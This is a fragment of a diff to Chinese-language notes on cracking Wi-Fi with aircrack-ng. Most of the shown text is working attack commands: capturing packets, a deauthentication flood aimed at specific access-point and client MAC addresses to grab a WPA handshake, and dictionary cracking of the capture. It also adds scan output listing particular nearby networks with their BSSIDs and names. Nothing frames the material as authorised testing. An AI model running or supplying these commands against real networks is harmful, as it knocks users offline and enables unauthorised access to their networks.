@@ -45,12 +45,13 @@ easside-ng		和AP接入点通讯（无WEP）
 tkiptun-ng		WPA/TKIP攻击
 wesside-ng		自动破解WEP密钥
 
-http://wenku.baidu.com/view/d659deea998fcc22bcd10d7e.html  windows 下使用方法
+  
+00:1F:1F:15:C7:B1 edimax
+38:83:45:C1:D5:34  -73        8        2    0   6  54e. WEP  WEP         zero-fuck 
+EC:17:2F:B0:34:C6  -64        4        0    0   6  54e. WEP  WEP         alex  
 
-ifconfig -a               查看所有的网卡 
-ifconfig wlan0 up         激活无线网卡 
-airmon-ng start wlan0     设置无线网卡模式 
-airodump-ng mon0          查看无线网络信息 
+
+
 airodump-ng -w akast -c 6 mon0      抓包 
 
 进行 Deauth 攻击获取 handshake 
@@ -72,11 +73,6 @@ aireplay-ng --deauth 1000 -a 00:09:5B:6F:64:1E -h 44:6D:57:C8:58:A0 mon0
 aircrack-ng -w 密码字典 akast*.cap       开始破解
 
 aircrack-ng WPAcrack-01.cap -w /pentest/passwords/wordlists/darkc0de 
-
-很好的说明
-http://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-psk-passwords-using-aircrack-ng-0148366/
-名词解释 
-http://null-byte.wonderhowto.com/how-to/hack-wi-fi-getting-started-with-terms-and-technologies-0147659/
 
 Pre-shared key mode (PSK, also known as Personal mode) is designed for home and small office networks that don't require the complexity of an 802.1X authentication server.[9] Each wireless network device encrypts the network traffic using a 256 bit key. This key may be entered either as a string of 64 hexadecimal digits, or as a passphrase of 8 to 63 printable ASCII characters.[10] If ASCII characters are used, the 256 bit key is calculated by applying the PBKDF2 key derivation function to the passphrase, using the SSID as the salt and 4096 iterations of HMAC-SHA1
 
